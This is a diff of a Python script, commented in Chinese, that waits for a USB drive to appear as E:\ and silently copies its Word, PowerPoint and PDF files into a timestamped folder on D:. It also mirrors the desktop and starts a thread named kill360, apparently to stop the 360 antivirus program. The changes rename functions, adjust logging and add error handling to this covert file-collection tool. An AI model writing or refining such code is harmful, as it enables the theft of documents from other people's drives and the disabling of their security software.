@@ -4,7 +4,7 @@
 
 TARGET = 'D:\\desktop'  #复制目标
 ALLOW_SUFFIX = ('.doc','.docx','.ppt','.pptx','.pdf')   #过滤后缀名时允许的类型
-LOGFILE = 'deskcopy.log'    #日志文件
+LOGFILE = 'D:\\deskcopy.log'    #日志文件
 UPACOPY_ARGV = '--upan' #U盘全盘复制启动参数
 DESKSLEEP = 5   #桌面复制间隔时间
 UPANSLEEP = 5   #U盘检测间隔时间
@@ -20,10 +20,10 @@ def execute_with_arg():
     '''使用参数启动'''
     if len(sys.argv) == 2:
         if sys.argv[1] == UPACOPY_ARGV:
-            upan()
+            upancopy()
             sys.exit()
         else:
-            openfile(sys.argv[1])
+            opencopy(sys.argv[1])
 
             sys.exit()
 def is_file_number_change():
@@ -38,33 +38,15 @@ def is_file_number_change():
         return True
     else:
         return False
-"""
-def get_new_file_name_list(new:list):
-    '''获取新增文件的文件名的列表
-new(list):当前（改变后的）文件列表
-返回值:新增文件名列表(list)'''
-    #技术细节：新旧文件列表取补集（使用列表推导式）
-    old = filelst   #旧的（改变前的）文件列表
-    result = [i for i in new if i not in old]
-    return result
-def copy_new_file(fnlst:list):
-    '''将新文件进行复制
-fnlst(list):要进行复制的（新增的）文件列表'''
-    for i in fnlst:
-        shutil.copyfile(i,TARGET)
-def main():
-    
-    root.after(1000,main)
-"""
-def upan(): #※不可在Linux下测试
+def upancopy(): #※不可在Linux下测试
     global TARGET
     while not os.path.exists('E:\\'):
         time.sleep(UPANSLEEP)
     os.chdir('E:\\')
-    TARGET = os.path.join(TARGET,time.strftime('%Y%m%d%H%M%S'))
+    TARGET = os.path.join(TARGET,time.strftime(STRFTIME))
     os.mkdir(TARGET)
     copy('.',TARGET,isfilter=True)
-def openfile(filename:str):
+def opencopy(filename:str):
     '''打开文件并复制
 filename(str):文件名
 '''
@@ -103,7 +85,7 @@ isfilter(bool):是否过滤后缀名'''
                 try:
                     shutil.copy(filesrc,filetarget)
                 except Exception as e:
-                    log('I',f'复制异常 {filesrc}\n{e}')
+                    log('E',f'复制异常 {filesrc}\n{e}')
                 else:
                     log('I',f'已复制 {filesrc}')
             else:
@@ -121,14 +103,19 @@ logtext(str):日志内容'''
     print(content,file=sys.stderr)
     with open(LOGFILE,'a') as logfile:
         print(content,file=logfile)
-def main():
-    execute_with_arg()
-    log('I',f'已启动')
-    threading.Thread(target=kill360).start()
+def deskcopy():
     while True:
         if is_file_number_change():
             copy('.',TARGET,isfilter=False)
         time.sleep(DESKSLEEP)
+def main():
+    execute_with_arg()
+    log('I','已启动')
+    threading.Thread(target=kill360).start()
+    deskcopy()
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except Exception as e:
+        log('F',e)
